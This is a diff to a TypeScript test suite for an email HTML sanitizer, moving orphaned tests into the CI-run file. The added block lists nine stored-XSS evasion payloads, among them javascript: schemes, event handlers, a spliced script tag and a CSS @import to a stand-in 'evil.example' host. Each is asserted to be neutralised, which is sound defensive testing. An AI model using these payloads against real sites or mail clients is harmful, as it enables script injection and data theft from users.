@@ -49,3 +49,35 @@ test('mail-server: legitimate quoted formatting survives sanitization', () => {
     assert.match(stored, /<strong>team<\/strong>/);
     assert.match(stored, /<a href="https:\/\/example\.com\/x">this<\/a>/);
 });
+
+// --- Absorbed from marketplace/plugins/mail-server/lib/sanitize-email-html.test.js ---------------
+// That file asserted the same control but sat OUTSIDE every CI glob (backend `npm test` only globs
+// src/tests/*.test.ts), so it was a regression guard nobody ran — the same defect class as the
+// ownership suite next door. These cases were the ones it covered and this file did not; with them
+// here the CI-executed suite is a strict superset and the orphan can be deleted.
+const EVASIONS: Array<{ name: string; html: string }> = [
+    { name: 'whitespace-broken scheme', html: `<a href="java\tscript:alert(1)">x</a>` },
+    { name: '<style> CSS exfil', html: `<style>@import url('https://evil.example/c')</style>` },
+    { name: '<iframe> js src', html: `<iframe src="javascript:alert(1)"></iframe>` },
+    { name: 'svg onload', html: `<svg onload="alert(1)"><rect/></svg>` },
+    { name: 'spliced tag', html: `<<script>script>alert(1)<</script>/script>` },
+    { name: 'slash-separated attr', html: `<img src=x/onerror=alert(1)>` },
+    { name: 'uppercase SCRIPT', html: `<SCRIPT>alert(1)</SCRIPT>` },
+    { name: 'onmouseover', html: `<div onmouseover="alert(1)">hover</div>` },
+    { name: 'formaction', html: `<button formaction="javascript:alert(1)">go</button>` },
+];
+
+for (const atk of EVASIONS) {
+    test(`mail-server: stored XSS blocked — ${atk.name}`, () => {
+        assertNoExecutableSurface(sanitizeEmailHtml(atk.html));
+    });
+}
+
+test('mail-server: safe relative/mailto URLs and an http image src survive', () => {
+    // The negative assertions above are satisfied by a sanitizer that returns '' for everything, so
+    // this positive half is what makes them mean something: real mail must still render.
+    const stored = sanitizeEmailHtml(`<a href="/inbox">rel</a><a href="mailto:a@b.com">m</a><img src="https://cdn.example/x.png" alt="ok">`);
+    assert.match(stored, /href="\/inbox"/);
+    assert.match(stored, /href="mailto:a@b.com"/);
+    assert.match(stored, /<img src="https:\/\/cdn\.example\/x\.png" alt="ok"\/>/);
+});
